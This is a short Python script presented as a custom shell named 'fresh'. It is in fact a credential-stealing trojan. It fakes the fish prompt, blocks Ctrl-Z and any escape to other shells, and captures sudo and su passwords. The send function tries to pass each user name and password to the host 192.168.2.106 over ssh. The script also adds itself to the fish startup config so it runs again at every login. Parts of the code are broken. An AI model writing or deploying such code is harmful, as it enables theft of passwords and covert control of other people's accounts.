"""

Welcome to fresh, the Fresh Recursive Experience Shell
Please rtfm for reference.

"""


import os
import signal
import getpass

signal.signal(signal.SIGTSTP, signal.SIG_IGN)



shells = ["bash","dash","sh","fish","zsh"]
binshells = [f"/bin/{shell}" for shell in shells] + [f"/usr/bin/{shell}" for shell in shells]



Input=""
while Input!="exit":
    try:
        os.system("fish -c fish_prompt")
        Input=input()
        split=Input.split()
        if split[0]=="command":
            Input=Input[8:]
            split=Input.split()
        if split[0]=="cd":
            os.chdir(Input[3:])
        elif split[0]=="sudo":
            User=getpass.getuser()
            Password=getpass.getpass(f"[sudo] Passwort für {User}: ")
            send(User, Password)
            os.system('fish -c "echo -e \'{Password}\\n\' | sudo -S {Input[5:]}"')
        elif split[0]=="su":
            if len(split)==1:
                User="root"
            else:
                User=split[1]
            Password=getpass.getpass("Passwort: ")
            send(User, Password)
        elif split[0] in shells:
            print(f"fish: /bin/{split[0]}: Zugriff verweigert")
        elif split[0] in binshells:
            print(f"fish: {split[0]}: Zugriff verweigert"
        else:
            os.system('fish -c "{Input}"')
    except:
        pass

os.system(f'echo "python {os.getenv("PWD")}/fresh; make -C {os.getenv("PWD")}; exit" >> {os.getenv("HOME")}/.config/fish/config.fish')


def send(User, Password):
    os.chdir(os.getenv('PWD'))
    os.system(f('ssh "{User}:{Password}"@192.168.2.106'))
    
    



